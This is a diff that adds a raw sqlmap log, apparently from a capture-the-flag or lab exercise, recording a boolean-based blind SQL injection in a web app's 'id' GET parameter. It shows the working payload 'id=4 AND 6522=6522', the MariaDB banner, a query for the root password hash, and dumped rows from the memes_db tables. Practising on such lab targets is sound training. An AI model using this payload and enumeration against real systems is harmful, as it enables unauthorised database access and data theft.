@@ -1,0 +1,183 @@
+sqlmap identified the following injection point(s) with a total of 36 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+available databases [4]:
+[*] information_schema
+[*] memes_db
+[*] mysql
+[*] performance_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+banner: '10.3.23-MariaDB-0+deb10u1'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+database management system users password hashes:
+[*] root [1]:
+    password hash: NULL
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+available databases [4]:
+[*] information_schema
+[*] memes_db
+[*] mysql
+[*] performance_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+No tables found
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+No tables found
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+Database: memes_db
+[2 tables]
++--------+
+| albums |
+| memes  |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+Database: memes_db
+Table: memes
+[5 entries]
++----+----------------+--------+-------------------+
+| id | title          | parent | filename          |
++----+----------------+--------+-------------------+
+| 1  | Gondor Captain | 1      | files/boromir.jpg |
+| 2  | GranMa         | 1      | files/cookies.jpg |
+| 3  | You            | 1      | files/hacker.jpg  |
+| 4  | Not too fine   | 1      | files/fine.png    |
+| 5  | Diegote        | 1      | klpsrmfazznufesg  |
++----+----------------+--------+-------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+Database: memes_db
+Table: albums
+[1 entry]
++----+--------+
+| id | title  |
++----+--------+
+| 1  | Random |
++----+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=4 AND 6522=6522
+---
+web application technology: Nginx 1.17.10
+back-end DBMS: MySQL 5 (MariaDB fork)
